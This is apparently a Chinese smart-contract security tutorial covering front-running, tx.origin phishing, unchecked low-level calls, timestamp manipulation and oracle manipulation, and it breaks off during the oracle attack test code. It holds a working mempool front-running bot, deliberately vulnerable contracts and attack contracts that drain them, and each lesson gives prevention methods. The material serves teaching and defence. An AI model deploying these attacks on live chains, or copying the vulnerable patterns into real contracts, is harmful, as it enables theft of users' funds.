在用户的交易被矿工打包进以太坊区块链之前，大部分交易会汇集到Mempool（交易内存池）中，矿工在这里寻找费用高的交易优先打包出块，实现利益最大化。通常来说，gas price越高的交易，越容易被打包。同时，一些`MEV`机器人也会搜索`mempool`中有利可图的交易。比如，一笔在去中心化交易所中滑点设置过高的`swap`交易可能会被三明治攻击：通过调整gas，套利者会在这笔交易之前插一个买单，再在之后发送一个卖单，并从中盈利。这等效于哄抬市价。



![img](https://www.wtf.academy/assets/images/S11-1-ce537251fae3eaf19235e18022c98cd7.png)



## 抢跑实践

如果你学会了抢跑，你就算是入门的币圈科学家了。接下来，让我们实践一下，抢跑一笔铸造NFT的交易。我们将会用到的工具：

- `Foundry`的`anvil`工具搭建本地测试链，请提前安装好 [foundry](https://book.getfoundry.sh/getting-started/installation)。
- `remix`进行NFT合约的部署和铸造
- `etherjs`脚本监听`mempool`并进行抢跑。

**1. 启动Foundry本地测试链：** 在安装好 `foundry` 之后，在命令行输入 `anvil --chain-id 1234 -b 10` 搭建本地测试链，chain-id 为 1234，每 10 秒产出一个区块。搭建成功后，它会在显示一些测试账户的地址和私钥，每个账户有 10000 ETH。你可以使用它们进行测试。



![img](https://www.wtf.academy/assets/images/S11-2-0e2e60ca2d032f8baecc84edeb3e7df0.png)



**2. 将Remix连接到测试链：** 打开 Remix 的部署页面，打开左上角的`Environment`下拉菜单，选`Foundry Provider`即可将 Remix 连接到测试链。



![img](https://www.wtf.academy/assets/images/S11-3-becc7bc83ef11cc36da50cd94b6156c7.png)



**3. 部署NFT合约：** 在 Remix 上部署一个简单的 freemint（免费铸造）NFT合约。它有一个`mint()`，用于免费铸造NFT。

```solidity
// SPDX-License-Identifier: MIT
// By 0xAA
pragma solidity ^0.8.21;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

// 我们尝试frontrun一笔Free mint交易
contract FreeMint is ERC721 {
    uint256 public totalSupply;

    // 构造函数，初始化NFT合集的名称、代号
    constructor() ERC721("Free Mint NFT", "FreeMint"){}

    // 铸造函数
    function mint() external {
        _mint(msg.sender, totalSupply); // mint
        totalSupply++;
    }
}
```



**4. 部署ethers.js抢跑脚本：** 简单来说，`frontrun.js`脚本监听了测试链`mempool`中的未决交易，筛选出调用了`mint()`的交易，然后复制它并调高`gas`进行抢跑。如果你不熟悉`ether.js`，可以阅读[WTF Ethers极简教程](https://github.com/WTFAcademy/WTF-Ethers)。

```js
// provider.on("pending", listener)
import { ethers, utils } from "ethers";

// 1. 创建provider
var url = "http://127.0.0.1:8545";
const provider = new ethers.providers.WebSocketProvider(url);
let network = provider.getNetwork()
network.then(res => console.log(`[${(new Date).toLocaleTimeString()}] 连接到 chain ID ${res.chainId}`));

// 2. 创建interface对象，用于解码交易详情。
const iface = new utils.Interface([
    "function mint() external",
])

// 3. 创建钱包，用于发送抢跑交易
const privateKey = '0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a'
const wallet = new ethers.Wallet(privateKey, provider)

const main = async () => {
    // 4. 监听pending的mint交易，获取交易详情，然后解码。
    console.log("\n4. 监听pending交易，获取txHash，并输出交易详情。")
    provider.on("pending", async (txHash) => {
        if (txHash) {
            // 获取tx详情
            let tx = await provider.getTransaction(txHash);
            if (tx) {
                // filter pendingTx.data
                if (tx.data.indexOf(iface.getSighash("mint")) !== -1 && tx.from != wallet.address ) {
                    // 打印txHash
                    console.log(`\n[${(new Date).toLocaleTimeString()}] 监听Pending交易: ${txHash} \r`);

                    // 打印解码的交易详情
                    let parsedTx = iface.parseTransaction(tx)
                    console.log("pending交易详情解码：")
                    console.log(parsedTx);
                    // Input data解码
                    console.log("raw transaction")
                    console.log(tx);

                    // 构建抢跑tx
                    const txFrontrun = {
                        to: tx.to,
                        value: tx.value,
                        maxPriorityFeePerGas: tx.maxPriorityFeePerGas * 1.2,
                        maxFeePerGas: tx.maxFeePerGas * 1.2,
                        gasLimit: tx.gasLimit * 2,
                        data: tx.data
                    }
                    // 发送抢跑交易
                    var txResponse = await wallet.sendTransaction(txFrontrun)
                    console.log(`正在frontrun交易`)
                    await txResponse.wait()
                    console.log(`frontrun 交易成功`)                
                }
            }
        }
    });

    provider._websocket.on("error", async () => {
        console.log(`Unable to connect to ${ep.subdomain} retrying in 3s...`);
        setTimeout(init, 3000);
      });

    provider._websocket.on("close", async (code) => {
        console.log(
            `Connection lost with code ${code}! Attempting reconnect in 3s...`
        );
        provider._websocket.terminate();
        setTimeout(init, 3000);
    });    
};

main()
```



**5. 调用`mint()`函数：** 在 Remix 的部署页面调用 Freemint 合约的`mint()` 函数，进行 NFT 铸造。

**6. 脚本监听到交易并进行抢跑** 我们可以在终端看到 `frontrun.js` 脚本成功监听到了交易，并进行了抢跑。如果你调用 NFT 合约的 `ownerOf()` 函数查看 `tokenId` 为 0 的持有者是抢跑脚本中的钱包地址，证明抢跑成功！。

![img](https://www.wtf.academy/assets/images/S11-4-d89c32f716f1264e0b0cd4d2af0308f6.png)



## 预防方法

抢先交易是以太坊等公链上普遍存在的问题。我们没法消除它，但是可以通过减少交易顺序或时间的重要性，减少被抢先交易的收益：

- 使用预提交方案(commit-reveal scheme)。
- 使用暗池，用户发出的交易将不进入公开的`mempool`，而是直接到矿工手里。例如 flashbots 和 TaiChi。
- 在调用参数中加上保护性参数，如[滑点保护](https://uniswapv3book.com/milestone_3/slippage-protection.html)，从而减少抢跑者的潜在收益。

## 总结

这一讲，我们介绍了以太坊的抢先交易，也叫抢跑。这种起源于传统金融行业的攻击模式在区块链中更容易实施，因为所有的交易信息都是公开的。我们做了一个抢跑的实践：抢跑一笔铸造 NFT 的交易。当需要有类似的交易时，最好支持隐藏的内存池，或者实施批量拍卖等措施限制。它是以太坊等公链上普遍存在的问题，我们没法消除它，但是可以通过减少交易顺序或时间的重要性，减少被抢先交易的收益。

# S12. tx.origin钓鱼攻击

这一讲，我们将介绍智能合约的`tx.origin`钓鱼攻击和预防方法。

## `tx.origin`钓鱼攻击

笔者上初中的时候特别喜欢玩游戏，但是项目方为了防止未成年人沉迷，规定只有身份证号显示已满十八岁的玩家才不受防沉迷限制。这该怎么办呢？后来笔者使用家长的身份证号进行年龄验证，并成功绕过了防沉迷系统。这个案例与`tx.origin`钓鱼攻击有着异曲同工之妙。

在`solidity`中，使用`tx.origin`可以获得启动交易的原始地址，它与`msg.sender`十分相似，下面我们用一个例子来区分它们之间不同的地方。

如果用户A调用了B合约，再通过B合约调用了C合约，那么在C合约看来，`msg.sender`就是B合约，而`tx.origin`就是用户A。如果你不了解`call`的机制，可以阅读[WTF Solidity极简教程第22讲：Call](https://github.com/AmazingAng/WTF-Solidity/blob/main/22_Call/readme.md)。



![img](https://www.wtf.academy/assets/images/S12_1-2a6b1cce139a456c5c7d054e3c544240.jpg)



因此如果一个银行合约使用了`tx.origin`做身份认证，那么黑客就有可能先部署一个攻击合约，然后再诱导银行合约的拥有者调用，即使`msg.sender`是攻击合约地址，但`tx.origin`是银行合约拥有者地址，那么转账就有可能成功。

## 漏洞合约例子

### 银行合约

我们先看银行合约，它非常简单，包含一个`owner`状态变量用于记录合约的拥有者，包含一个构造函数和一个`public`函数：

- 构造函数: 在创建合约时给`owner`变量赋值.
- `transfer()`: 该函数会获得两个参数`_to`和`_amount`，先检查`tx.origin == owner`，无误后再给`_to`转账`_amount`数量的ETH。**注意：这个函数有被钓鱼攻击的风险！**

```solidity
contract Bank {
    address public owner;//记录合约的拥有者

    //在创建合约时给 owner 变量赋值
    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        //检查消息来源 ！！！ 可能owner会被诱导调用该函数，有钓鱼风险！
        require(tx.origin == owner, "Not owner");
        //转账ETH
        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}
```



### 攻击合约

然后是攻击合约，它的攻击逻辑非常简单，就是构造出一个`attack()`函数进行钓鱼，将银行合约拥有者的余额转账给黑客。它有`2`个状态变量`hacker`和`bank`，分别用来记录黑客地址和要攻击的银行合约地址。

它包含`2`个函数：

- 构造函数:初始化`bank`合约地址.
- `attack()`：攻击函数，该函数需要银行合约的`owner`地址调用，`owner`调用攻击合约，攻击合约再调用银行合约的`transfer()`函数，确认`tx.origin == owner`后，将银行合约内的余额全部转移到黑客地址中。

```solidity
contract Attack {
    // 受益者地址
    address payable public hacker;
    // Bank合约地址
    Bank bank;

    constructor(Bank _bank) {
        //强制将address类型的_bank转换为Bank类型
        bank = Bank(_bank);
        //将受益者地址赋值为部署者地址
        hacker = payable(msg.sender);
    }

    function attack() public {
        //诱导bank合约的owner调用，于是bank合约内的余额就全部转移到黑客地址中
        bank.transfer(hacker, address(bank).balance);
    }
}
```

> [!TIP]
>
> `tx.origin` 的使用引入了潜在的钓鱼攻击风险。假设攻击者部署了一个恶意合约，并诱导 `Bank` 合约的 `owner` 调用该恶意合约的某个函数。在恶意合约中，它再间接调用 `Bank` 合约的 `transfer` 函数。由于 `tx.origin` 是 `owner` 的地址，因此权限检查会通过，攻击者可以将 `Bank` 合约中的资金转移到任意地址。
>
> ### 攻击流程示例：
>
> 1. 攻击者部署恶意合约 `Attack`，并诱导 `Bank` 合约的所有者调用 `Attack` 合约。
> 2. `Attack` 合约调用 `Bank` 合约的 `transfer` 函数，并成功通过权限检查（因为 `tx.origin == owner`）。
> 3. `Bank` 合约的资金被转移到攻击者控制的地址。



## `Remix` 复现

**1.** 先将`value`设置为10ETH，再部署 `Bank` 合约，拥有者地址 `owner` 被初始化为部署合约地址。



![img](https://www.wtf.academy/assets/images/S12-2-60555b4fddc2c74e59e437a4e5dfabc1.jpg)



**2.** 切换到另一个钱包作为黑客钱包，填入要攻击的银行合约地址，再部署 `Attack` 合约，黑客地址 `hacker` 被初始化为部署合约地址。



![img](https://www.wtf.academy/assets/images/S12-3-9f230efb3aff04c1b02864142fd66c5f.jpg)



**3.** 切换回`owner`地址，此时我们被诱导调用了`Attack`合约的`attack()`函数，可以看到`Bank`合约余额被掏空了，同时黑客地址多了10ETH.



![img](https://www.wtf.academy/assets/images/S12-4-cb3a409bf563e6d77b2a97292931ba60.jpg)



## 预防办法

目前主要有两种办法来预防可能的`tx.origin`钓鱼攻击。

### 1.使用`msg.sender`代替`tx.origin`

`msg.sender`能够获取直接调用当前合约的调用发送者地址，通过对`msg.sender`的检验，就可以避免整个调用过程中混入外部攻击合约对当前合约的调用

```solidity
function transfer(address payable _to, uint256 _amount) public {
  require(msg.sender == owner, "Not owner");

  (bool sent, ) = _to.call{value: _amount}("");
  require(sent, "Failed to send Ether");
}
```



### 2.检验`tx.origin == msg.sender`

如果一定要使用`tx.origin`，那么可以再检验`tx.origin`是否等于`msg.sender`，这样也可以避免整个调用过程中混入外部攻击合约对当前合约的调用。但是副作用是其他合约将不能调用这个函数。

```solidity
    function transfer(address payable _to, uint _amount) public {
        require(tx.origin == owner, "Not owner");
        require(tx.origin == msg.sender, "can't call by external contract");
        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
```



## 总结

这一讲，我们介绍了智能合约中的`tx.origin`钓鱼攻击，目前有两种方法可以预防它：一种是使用`msg.sender`代替`tx.origin`；另一种是同时检验`tx.origin == msg.sender`。推荐使用第一种方法预防，因为后者会拒绝所有来自其他合约的调用。

# S13. 未检查的低级调用

这一讲，我们将介绍智能合约的未检查低级调用（low-level call）的漏洞。失败的低级调用不会让交易回滚，如果合约中忘记对其返回值进行检查，往往会出现严重的问题。

## 低级调用

以太坊的低级调用包括 `call()`，`delegatecall()`，`staticcall()`，和`send()`。这些函数与 Solidity 其他函数不同，当出现异常时，它并不会向上层传递，也不会导致交易完全回滚；它只会返回一个布尔值 `false` ，传递调用失败的信息。因此，如果未检查低级函数调用的返回值，则无论低级调用失败与否，上层函数的代码会继续运行。对于低级调用更多的内容，请阅读 [WTF Solidity 极简教程第20-23讲](https://github.com/AmazingAng/WTF-Solidity)。

> [!TIP]
>
> ### 低级别调用的特点：
> - **不抛出异常**：低级别调用不会像 Solidity 的普通函数那样在失败时自动抛出异常，而是返回一个布尔值 (`true` 或 `false`) 来表示成功与否。调用者必须手动处理这些结果，并确保在失败时采取相应的措施，例如使用 `require` 来检查返回值。
>   
> - **灵活性更高**：低级别调用提供了更大的灵活性，因为它允许传递任意数量的 gas 和数据。这对于某些高级应用（如代理合约、可升级合约、动态调用合约）非常有用。
>
> - **更容易出错**：由于低级别调用不会自动处理错误，因此如果开发者没有正确检查返回值，可能会导致严重的安全问题，比如重入攻击、资金丢失等。
>
> ### 举例对比：
> 标准的 Solidity 函数调用会自动抛出异常，安全性更高。例如：
>
> ```solidity
> contract SafeTransfer {
>     function transfer(address payable recipient, uint256 amount) public {
>         recipient.transfer(amount);  // 安全的，自动抛出错误
>     }
> }
> ```
>
> 而低级别调用 `call` 则需要手动检查返回值：
>
> ```solidity
> contract UnsafeTransfer {
>     function transfer(address payable recipient, uint256 amount) public {
>         (bool success, ) = recipient.call{value: amount}("");
>         require(success, "Transfer failed");  // 必须手动检查
>     }
> }
> ```
>
> ### 低级别调用的应用场景：
> - **代理合约**：通过 `delegatecall` 实现的代理合约（如可升级合约）。
> - **多功能调用**：`call` 可用于传递复杂的数据和 ETH，灵活性高，适用于与其他合约的复杂交互。
> - **安全的 ETH 转账**：由于 `send` 限制了 gas 用量，它可以有效防止某些恶意合约在转账过程中消耗过多的 gas。
>
> 低级别调用的使用需要更加谨慎，开发者通常需要通过额外的代码和检查来确保安全性。

最容易出错的是`send()`：一些合约使用 `send()` 发送 `ETH`，但是 `send()` 限制 gas 要低于 2300，否则会失败。当目标地址的回调函数比较复杂时，花费的 gas 将高于 2300，从而导致 `send()` 失败。如果此时在上层函数没有检查返回值的话，交易继续执行，就会出现意想不到的问题。2016年，有一款叫 `King of Ether` 的链游，因为这个漏洞导致退款无法正常发送（[验尸报告](https://www.kingoftheether.com/postmortem.html)）。



![img](https://www.wtf.academy/assets/images/S13-1-734ea9ca7133a511790c92cc74362f1a.png)



## 漏洞例子

### 银行合约

这个合约是在`S01 重入攻击`教程中的银行合约基础上修改而成。它包含`1`个状态变量`balanceOf`记录所有用户的以太坊余额；并且包含`3`个函数：

- `deposit()`：存款函数，将`ETH`存入银行合约，并更新用户的余额。
- `withdraw()`：提款函数，将调用者的余额转给它。具体步骤和上面故事中一样：查询余额，更新余额，转账。**注意：这个函数没有检查 `send()` 的返回值，提款失败但余额会清零！**
- `getBalance()`：获取银行合约里的`ETH`余额。

```solidity
contract UncheckedBank {
    mapping (address => uint256) public balanceOf;    // 余额mapping

    // 存入ether，并更新余额
    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    // 提取msg.sender的全部ether
    function withdraw() external {
        // 获取余额
        uint256 balance = balanceOf[msg.sender];
        require(balance > 0, "Insufficient balance");
        balanceOf[msg.sender] = 0;
        // Unchecked low-level call
        bool success = payable(msg.sender).send(balance);
    }

    // 获取银行合约的余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```



## 攻击合约

我们构造了一个攻击合约，它刻画了一个倒霉的储户，取款失败但是银行余额清零：合约回调函数 `receive()` 中的 `revert()` 将回滚交易，因此它无法接收 `ETH`；但是提款函数 `withdraw()` 却能正常调用，清空余额。

```solidity
contract Attack {
    UncheckedBank public bank; // Bank合约地址

    // 初始化Bank合约地址
    constructor(UncheckedBank _bank) {
        bank = _bank;
    }
    
    // 回调函数，转账ETH时会失败
    receive() external payable {
        revert();
    }

    // 存款函数，调用时 msg.value 设为存款数量
    function deposit() external payable {
        bank.deposit{value: msg.value}();
    }

    // 取款函数，虽然调用成功，但实际上取款失败
    function withdraw() external payable {
        bank.withdraw();
    }

    // 获取本合约的余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```



## `Remix`复现

1. 部署 `UncheckedBank` 合约。
2. 部署 `Attack` 合约，构造函数填入 `UncheckedBank` 合约地址。
3. 调用 `Attack` 合约的 `deposit()` 存款函数，存入`1 ETH`。
4. 调用 `Attack` 合约的 `withdraw()` 提款函数，进行提款，调用成功。
5. 分别调用 `UncheckedBank` 合约的 `balanceOf()` 函数和 `Attack` 合约的 `getBalance()` 函数。尽管上一步调用成功并且储户余额被清空，但是提款失败了。

## 预防办法

你可以使用以下几种方法来预防未检查低级调用的漏洞：

1. 检查低级调用的返回值，在上面的银行合约中，我们可以改正 `withdraw()`。

   ```solidity
   function withdraw() external {
       uint256 balance = balanceOf[msg.sender];
       require(balance > 0, "Insufficient balance");
   
       // 先更新余额，防止重入攻击
       balanceOf[msg.sender] = 0;
   
       // 发送ETH并检查返回值
       bool success = payable(msg.sender).send(balance);
       require(success, "Failed Sending ETH!");  // 添加了require来确保发送成功
   }
   
   ```

   

2. 合约转账`ETH`时，使用 `call()`，并做好重入保护。

3. 使用`OpenZeppelin`的[Address库](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol)，它将检查返回值的低级调用封装好了。

## 总结

我们将介绍未检查低级调用的漏洞及其预防方法。以太坊的低级调用（call, delegatecall, staticcall, send）在失败时会返回一个布尔值 false，但不会让整个交易回滚。如果开发者没有对它进行检查的话，则会发生意外。

# S14. 操纵区块时间

这一讲，我们将介绍智能合约的操纵区块时间攻击，并使用 Foundry 复现。在合并（The Merge）之前，以太坊矿工可以操纵区块时间，如果抽奖合约的伪随机数依赖于区块时间，则可能被攻击。

## 区块时间

区块时间（block timestamp）是包含在以太坊区块头中的一个 `uint64` 值，代表此区块创建的 UTC 时间戳（单位：秒），在合并（The Merge）之前，以太坊会根据算力调整区块难度，因此出块时间不定，平均 14.5s 出一个区块，矿工可以操纵区块时间；合并之后，改为固定 12s 一个区块，验证节点不能操纵区块时间。

在 Solidity 中，开发者可以通过全局变量 `block.timestamp` 获取当前区块的时间戳，类型为 `uint256`。

## 漏洞例子

此例子由[WTF Solidity合约安全: S07. 坏随机数](https://github.com/AmazingAng/WTF-Solidity/tree/main/S07_BadRandomness)中的合约改写而成。我们改变了 `mint()` 铸造函数的条件：当区块时间能被 170 整除时才能成功铸造：

```solidity
contract TimeManipulation is ERC721 {
    uint256 totalSupply;

    // 构造函数，初始化NFT合集的名称、代号
    constructor() ERC721("", ""){}

    // 铸造函数：当区块时间能被7整除时才能mint成功
    function luckyMint() external returns(bool success){
        if(block.timestamp % 170 == 0){
            _mint(msg.sender, totalSupply); // mint
            totalSupply++;
            success = true;
        }else{
            success = false;
        }
    }
}
```



## Foundry复现攻击

攻击者只需操纵区块时间，将它设为能被 170 整除的数字，就可以成功铸造 NFT。我们选择 Foundry 来复现这个攻击，因为它提供了修改区块时间的作弊码（cheatcodes）。如果你不了解 Foundry/作弊码，可以阅读 [Foundry教程](https://github.com/AmazingAng/WTF-Solidity/blob/main/Topics/Tools/TOOL07_Foundry/readme.md) 和 [Foundry Book](https://book.getfoundry.sh/forge/cheatcodes)。

代码大致逻辑

1. 创建一个 `TimeManipulation` 合约变量 `nft`。
2. 创建一个钱包地址 `alice`。
3. 使用作弊码 `vm.warp()` 将区块时间改为 169，由于不能被170整除，铸造失败。
4. 使用作弊码 `vm.warp()` 将区块时间改为 17000，由于可以被170整除，铸造成功。

代码：

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.21;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/TimeManipulation.sol";

contract TimeManipulationTest is Test {
    TimeManipulation public nft;

    // Computes address for a given private key
    address alice = vm.addr(1);

    function setUp() public {
        nft = new TimeManipulation();
    }

    // forge test -vv --match-test  testMint
    function testMint() public {
        console.log("Condition 1: block.timestamp % 170 != 0");
        // Set block.timestamp to 169
        vm.warp(169);
        console.log("block.timestamp: %s", block.timestamp);
        // Sets all subsequent calls' msg.sender to be the input address
        // until `stopPrank` is called
        vm.startPrank(alice);
        console.log("alice balance before mint: %s", nft.balanceOf(alice));
        nft.luckyMint();
        console.log("alice balance after mint: %s", nft.balanceOf(alice));

        // Set block.timestamp to 17000
        console.log("Condition 2: block.timestamp % 170 == 0");
        vm.warp(17000);
        console.log("block.timestamp: %s", block.timestamp);
        console.log("alice balance before mint: %s", nft.balanceOf(alice));
        nft.luckyMint();
        console.log("alice balance after mint: %s", nft.balanceOf(alice));
        vm.stopPrank();
    }
}
```



在安装好 Foundry 之后，在命令行输入下列命令启动新项目，并安装 openzeppelin 库：

```shell
forge init TimeManipulation
cd TimeManipulation
forge install Openzeppelin/openzeppelin-contracts
```



将这一讲的代码分别复制到`src`和`test`目录下，然后使用下列命令启动测试用例：

```shell
forge test -vv --match-test testMint
```



输出如下：

```shell
Running 1 test for test/TimeManipulation.t.sol:TimeManipulationTest
[PASS] testMint() (gas: 94666)
Logs:
  Condition 1: block.timestamp % 170 != 0
  block.timestamp: 169
  alice balance before mint: 0
  alice balance after mint: 0
  Condition 2: block.timestamp % 170 == 0
  block.timestamp: 17000
  alice balance before mint: 0
  alice balance after mint: 1

Test result: ok. 1 passed; 0 failed; finished in 7.64ms
```



我们可以看到，当我们将`block.timestamp` 修改为 17000时，铸造成功。

## 总结

这一讲，我们介绍了智能合约的操纵区块时间攻击，并使用 Foundry 复现了它。在合并（The Merge）之前，以太坊矿工可以操纵区块时间，如果抽奖合约的伪随机数依赖于区块时间，则可能被攻击。合并之后，以太坊改为固定 12s 一个区块，并且验证节点不能操纵区块时间。因此这类攻击不会在以太坊上发生，但仍可能在其他公链中遇到。

# S15. 操纵预言机

这一讲，我们将介绍智能合约的操纵预言机攻击，并复现了一个攻击示例：用`1 ETH`兑换17万亿枚稳定币。仅2022年一年，操纵预言机攻击造成用户资产损失超过 2 亿美元。

## 价格预言机

出于安全性的考虑，以太坊虚拟机（EVM）是一个封闭孤立的沙盒。在EVM上运行的智能合约可以接触链上信息，但无法主动和外界沟通获取链下信息。但是，这类信息对去中心化应用非常重要。

预言机（oracle）可以帮助我们解决这个问题，它从链下数据源获得信息，并将其添加到链上，供智能合约使用。

其中最常用的就是价格预言机（price oracle），它可以指代任何可以让你查询币价的数据源。典型用例：

- 去中心借贷平台（AAVE）使用它来确定借款人是否已达到清算阈值。
- 合成资产平台（Synthetix）使用它来确定资产最新价格，并支持 0 滑点交易。
- MakerDAO使用它来确定抵押品的价格，并铸造相应的稳定币 $DAI。



![img](https://www.wtf.academy/assets/images/S15-1-bad1984798cc791a2beb0ce8a99760cb.png)



## 预言机漏洞

如果预言机没有被开发者正确使用，会造成很大的安全隐患。

- 2021年10月，BNB链上的DeFi平台Cream Finance因为预言机漏洞[被盗用户资金 1.3亿 美元](https://rekt.news/cream-rekt-2/)。
- 2022年5月，Terra链上的合成资产平台Mirror Protocol因为预言机漏洞[被盗用户资金 1.15亿 美元](https://rekt.news/mirror-rekt/)。
- 2022年10月，Solana链上的去中心化借贷平台Mango Market因为预言机漏洞[被盗用户资金 1.15亿 美元](https://rekt.news/mango-markets-rekt/)。

## 漏洞例子

下面我们学习一个预言机漏洞的例子，`oUSD` 合约。该合约是一个稳定币合约，符合ERC20标准。类似合成资产平台Synthetix，用户可以在这个合约中零滑点的将 `ETH` 兑换为 `oUSD`（Oracle USD）。兑换价格由自定义的价格预言机（`getPrice()`函数）决定，这里采取的是Uniswap V2的 `WETH-BUSD` 的瞬时价格。在之后的攻击示例中，我们会看到这个预言机在使用闪电贷和大额资金的情况下非常容易被操纵。

### 漏洞合约

`oUSD`合约包含`7`个状态变量，用来记录`BUSD`，`WETH`，`UniswapV2`工厂合约，和`WETH-BUSD`币对合约的地址。

`oUSD`合约主要包含`3`个函数:

- 构造函数: 初始化 `ERC20` 代币的名称和代号。

- getPrice()：价格预言机，获取Uniswap V2的WETH-BUSD的瞬时价格，这也是漏洞所在。

  ```solidity
    // 获取ETH price
    function getPrice() public view returns (uint256 price) {
        // pair 交易对中储备
        (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();
        // ETH 瞬时价格
        price = reserve0/reserve1;
    }
  ```

  

- `swap()`：兑换函数，将 `ETH` 以预言机给定的价格兑换为 `oUSD`。

合约代码：

```solidity
contract oUSD is ERC20{
    // 主网合约
    address public constant FACTORY_V2 =
        0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant BUSD = 0x4Fabb145d64652a948d72533023f6E7A623C7C53;

    IUniswapV2Factory public factory = IUniswapV2Factory(FACTORY_V2);
    IUniswapV2Pair public pair = IUniswapV2Pair(factory.getPair(WETH, BUSD));
    IERC20 public weth = IERC20(WETH);
    IERC20 public busd = IERC20(BUSD);

    constructor() ERC20("Oracle USD","oUSD"){}

    // 获取ETH price
    function getPrice() public view returns (uint256 price) {
        // pair 交易对中储备
        (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();
        // ETH 瞬时价格
        price = reserve0/reserve1;
    }

    function swap() external payable returns (uint256 amount){
        // 获取价格
        uint price = getPrice();
        // 计算兑换数量
        amount = price * msg.value;
        // 铸造代币
        _mint(msg.sender, amount);
    }
}
```

> [!NOTE]
>
> 这几行代码是在合约的构造过程中，设置与 Uniswap 相关的合约和代币的实例。下面是每行代码的具体解释：
>
> ### 代码解析
>
> 1. **`IUniswapV2Factory public factory = IUniswapV2Factory(FACTORY_V2);`**  
>    - 这行代码创建了一个 `IUniswapV2Factory` 接口类型的 `factory` 变量，并将其初始化为 Uniswap V2 的工厂合约地址 `FACTORY_V2`。  
>    - `FACTORY_V2` 是一个常量，代表 Uniswap V2 工厂合约的地址，允许该合约与 Uniswap 进行交互。
>
> 2. **`IUniswapV2Pair public pair = IUniswapV2Pair(factory.getPair(WETH, BUSD));`**  
>    - 这行代码通过调用 `factory.getPair(WETH, BUSD)` 方法来获取 WETH 和 BUSD 的交易对合约地址，并将其初始化为 `IUniswapV2Pair` 接口类型的 `pair` 变量。  
>    - `getPair()` 方法返回对应的交易对合约，该合约负责 WETH 和 BUSD 之间的流动性池。`pair` 变量将用于与该交易对合约交互。
>
> 3. **`IERC20 public weth = IERC20(WETH);`**  
>    - 这行代码创建了一个 `IERC20` 接口类型的 `weth` 变量，并将其初始化为 WETH 的合约地址。  
>    - 通过该变量，合约可以调用 WETH 合约中的函数，比如转账、获取余额等。
>
> 4. **`IERC20 public busd = IERC20(BUSD);`**  
>    - 类似于 WETH，这行代码创建了一个 `IERC20` 接口类型的 `busd` 变量，并将其初始化为 BUSD 的合约地址。  
>    - 这使得合约可以与 BUSD 合约进行交互。
>
> ### 总结
>
> 这几行代码的主要目的是在合约中设置与 Uniswap 和代币相关的合约实例，以便在后续的函数中能够方便地调用这些合约的功能。这些实例化的变量使得合约能够通过与 Uniswap 的流动性池进行交互，从而实现代币的兑换和价格的获取。



### 攻击思路

我们针对有漏洞的价格预言机 `getPrice()` 函数进行攻击，步骤：

1. 准备一些 `BUSD`，可以是自有资金，也可以是闪电贷借款。在实现中，我们利用 Foundry 的 `deal` cheatcode 在本地网络上给自己铸造了 `1_000_000 BUSD`
2. 在 UniswapV2 的 `WETH-BUSD` 池中使用`BUSD`大量买入 `WETH`。具体实现见攻击代码的 `swapBUSDtoWETH()` 函数。
3. 在此情况下，`WETH-BUSD`池中代币对比例失去了平衡，`WETH` 瞬时价格暴涨，这时我们调用 `swap()` 函数将 `ETH` 转换为 `oUSD`。
4. **可选:** 在 UniswapV2 的 `WETH-BUSD` 池中卖出第2步买入的 `WETH`，收回本金。

这4步可以在一个交易中完成。

### Foundry 复现

我们选用 Foundry 进行操纵预言机攻击的复现，因为它很快，并且可以创建主网的本地分叉，方便测试。如果你不了解 Foundry，可以阅读 [WTF Solidity工具篇 T07: Foundry](https://github.com/AmazingAng/WTF-Solidity/blob/main/Topics/Tools/TOOL07_Foundry/readme.md)。

1. 在安装好 Foundry 之后，在命令行输入下列命令启动新项目，并安装 openzeppelin 库。

   ```shell
   forge init Oracle
   cd Oracle
   forge install Openzeppelin/openzeppelin-contracts
   ```

   

2. 在根目录下创建 `.env` 环境变量文件，并在其中添加主网rpc，用于创建本地测试网。

   ```text
   MAINNET_RPC_URL= https://rpc.ankr.com/eth
   ```

   

3. 将这一讲的代码，`Oracle.sol` 和 `Oracle.t.sol`，分别复制到根目录的 `src` 和 `test` 文件夹下，然后使用下列命令启动攻击脚本。

   ```text
   forge test -vv --match-test testOracleAttack
   ```

   

4. 我们可以在终端中看到攻击结果。在攻击前，预言机 `getPrice()` 给出的 `ETH` 价格为 `1216 USD`，是正常的。但在我们使用 `1,000,000` BUSD 在 UniswapV2 的 `WETH-BUSD` 池子中买入 `WETH` 之后，预言机给出的价格被操纵为 `17,979,841,782,699 USD`。这时，我们可以轻松的用 `1 ETH` 兑换17万亿枚 `oUSD`，完成攻击。

   ```shell
   Running 1 test for test/Oracle.t.sol:OracleTest
   [PASS] testOracleAttack() (gas: 356524)
   Logs:
     1. ETH Price (before attack): 1216
     2. Swap 1,000,000 BUSD to WETH to manipulate the oracle
     3. ETH price (after attack): 17979841782699
     4. Minted 1797984178269 oUSD with 1 ETH (after attack)
   
   Test result: ok. 1 passed; 0 failed; finished in 262.94ms
   ```

   

攻击代码：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;
import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Oracle.sol";

contract OracleTest is Test {
    address private constant alice = address(1);
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant BUSD = 0x4Fabb145d64652a948d72533023f6E7A623C7C53;
    address private constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router router;
    IWETH private weth = IWETH(WETH);
    IBUSD private busd = IBUSD(BUSD);
    string MAINNET_RPC_URL;
    oUSD ousd;

    function setUp() public {
